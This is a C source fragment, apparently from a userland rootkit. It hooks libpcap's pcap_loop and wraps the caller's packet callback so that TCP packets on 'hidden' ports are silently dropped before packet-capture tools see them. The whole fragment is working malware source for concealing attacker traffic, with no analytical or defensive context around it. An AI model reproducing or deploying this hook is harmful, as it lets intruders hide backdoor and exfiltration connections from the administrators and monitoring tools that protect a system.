void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
{
    const struct sniff_ip *ip;
    const struct sniff_tcp *tcp;
    int size_ip, size_tcp, sport, dport;

    ip = (struct sniff_ip *)(packet + SIZE_ETHERNET);
    if((size_ip = IP_HL(ip) * 4) < 20) return;

    if(ip->ip_p != IPPROTO_TCP){
        if(o_callback) o_callback(args, header, packet);
        return;
    }

    tcp = (struct sniff_tcp *)(packet + SIZE_ETHERNET + size_ip);
    if((size_tcp = TH_OFF(tcp) * 4) < 20) return;

    sport = htons(tcp->th_sport);
    dport = htons(tcp->th_dport);

    if(is_hidden_port(sport) || is_hidden_port(dport)) return;
    else if(o_callback) o_callback(args, header, packet);
}

int pcap_loop(pcap_t *p, int cnt, pcap_handler callback, u_char *user)
{
    o_callback = callback;
    hook(CPCAP_LOOP);
    return (long)call(CPCAP_LOOP, p, cnt, got_packet, user);
}